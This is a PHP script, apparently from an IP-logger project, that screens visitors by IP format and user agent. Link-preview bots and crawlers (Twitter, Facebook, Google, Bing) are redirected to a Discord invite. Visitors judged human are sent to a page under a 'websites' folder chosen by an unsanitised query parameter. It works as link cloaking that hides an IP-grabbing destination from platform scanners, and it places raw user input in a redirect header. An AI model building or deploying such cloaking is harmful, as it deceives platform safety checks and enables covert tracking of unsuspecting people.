<?php 
function IsValidIP() 
{ 
    //https://github.com/CybrDev/IP-Logger Get_IP
	$ip = "unknown";
    if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) $ip = getenv("HTTP_CLIENT_IP"); 
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) $ip = getenv("HTTP_X_FORWARDED_FOR"); 
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) $ip = getenv("REMOTE_ADDR"); 
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) $ip = $_SERVER['REMOTE_ADDR'];     
	if($ip == "::1") return true; //localhost
	return preg_match('/^(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]\d|\d)(?:[.](?:25[0-5]|2[0-4]\d|1\d\d|[1-9]\d|\d)){3}$/', $ip); //Is IP like num.num.num.num  NUM is number b/w 0-999 //https://stackoverflow.com/a/31784191/14919621
} 

function IsValidUserAgent() 
{
    if (empty($_SERVER['HTTP_USER_AGENT'])) return false;
    $User_Agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    //$b means list of bots user agents, Mostly these words came in bots user agent, So we don't allow them.
    $Bots = explode(" ","http:// https:// + .com twitterbot facebot googlebot tumblr linkedinbot snapchat slurp yahoo microsoft bingbot framework bot");
    //$h means list of human user agents, Mostly these words came in human user agent, So we allow only them.
    $Humans =  explode(" ","apple firefox windows android linux chrome safari gecko iphone macintosh mac khtml browser nokia opera mozilla mobile network blackberry cpu outlook pc");
    foreach ($Bots as $Bot) if (substr_count($User_Agent , $Bot) > 0) return false;
    foreach ($Humans as $Human) if (substr_count($User_Agent,$Human) > 0) return true;
    	 
}

if((IsValidIP() and IsValidUserAgent()) == true) 
{	//echo "NOT BOT";
	if(isset($_GET['redirect'])) header( "Location: .././websites/".$_GET['filename'].(isset($_GET["redirect"]) ? ("?redirect=". $_GET['redirect']) : ""));die();
}
header( "Location: https://discord.com/invite/Hu5XPGMTuk");
die();

?>
